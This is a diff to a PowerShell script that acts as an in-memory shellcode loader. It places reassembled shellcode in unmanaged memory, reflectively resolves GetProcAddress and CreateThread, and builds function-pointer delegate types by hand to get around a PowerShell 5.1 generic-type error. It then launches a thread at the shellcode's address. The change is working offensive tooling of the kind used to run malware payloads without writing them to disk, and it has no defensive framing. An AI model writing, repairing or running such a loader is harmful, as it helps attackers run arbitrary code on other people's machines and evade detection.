@@ -40,21 +40,25 @@ $address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
 if ($address -ne [IntPtr]::Zero) {
     Write-Host "Reassembled Shellcode placed in RAM at: $address"
 
-    # 1. Get GetProcAddress to find CreateThread
-    # We use the same method that worked for vAlloc to get GetProcAddress first
+    # 1. Get GetProcAddress surgically
     $gpaMethod = $native.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
     $gpaAddr = $gpaMethod.MethodHandle.GetFunctionPointer()
-    $gpaDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, [Func[IntPtr, String, IntPtr]])
 
-    # 2. Use GetProcAddress to find CreateThread in the kernel32 handle we already have
+    # 2. Use a "Delegate Type Maker" to avoid the Generic Type error
+    # This creates a 'Func' type that PS 5.1 can actually handle
+    $gpaDelegateType = [Action[IntPtr, String]].Assembly.GetType('System.Func`3').MakeGenericType(@([IntPtr], [String], [IntPtr]))
+    $gpaDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, $gpaDelegateType)
+
+    # 3. Find CreateThread in kernel32
     $ctAddr = $gpaDelegate.Invoke($k32Handle, "CreateThread")
     Write-Host "Launcher found at: $ctAddr"
 
     if ($ctAddr -ne [IntPtr]::Zero) {
-        # 3. Create the Launcher Delegate
-        $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+        # 4. Create the Thread Launcher Delegate (using the same type-making trick)
+        $ctDelegateType = [Action[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr]].Assembly.GetType('System.Func`7').MakeGenericType(@([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr]))
+        $ctDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ctAddr, $ctDelegateType)
 
-        # 4. Launch!
+        # 5. Launch!
         Write-Host "Launching Thread..."
         $ctDelegate.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
         
